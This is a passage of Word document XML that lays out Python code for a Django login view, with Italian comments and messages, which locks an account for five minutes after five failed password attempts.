            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>timedelta</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
          <w:p w14:paraId="3ED018A4" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="504E2125"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def </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>login_view</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(request):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="605A72EA"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email = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>request.POST.get</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>("email")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08F7591F"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user = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>User.objects.filter</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(email=email</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>).first</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1422B323" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="123EF406"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 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>Recupera</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>tentativi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> da DB o cache</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14244766"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attempts = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>cache.get</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>"login_</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>attempts</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_{email}"</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>, 0)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ED3D6E4"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w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>blocked_until</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>cache.get</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>"blocked_</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>until</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_{email}"</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FE7C391" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="69466A3D"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if </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>blocked_until</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> and </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>timezone.now</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">) &lt; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>blocked_until</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D669AD3"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return </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>HttpResponse</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">"Account </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>bloccato</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>Riprova</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>tra</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> 5 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>minuti</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>.", status=403)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="744E635F" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7E4721BA"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if user and </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>user.check</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_password</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>request.POST</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>["password"]):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09E5E445"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w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>cache.delete</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f"login_</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>attempts</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_{email}"</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5372DCBE"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return </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>login_</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>success</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="788B4F45" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">    else:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="136CF9A3"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attempts += 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56B1A786"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w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>cache.set</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f"login_</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>attempts</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_{email}"</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>, attempts, timeout=300)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78749A31" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="2C4C33D3"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if attempts &gt;= 5:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="026D0065"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w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>cache.set</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f"blocked_</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>until</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_{email}"</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>timezone.now</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">) + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>timedelta</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(minutes=5), timeout=300)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AB4D4E5" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">            return </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>HttpResponse</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>"</w:t>
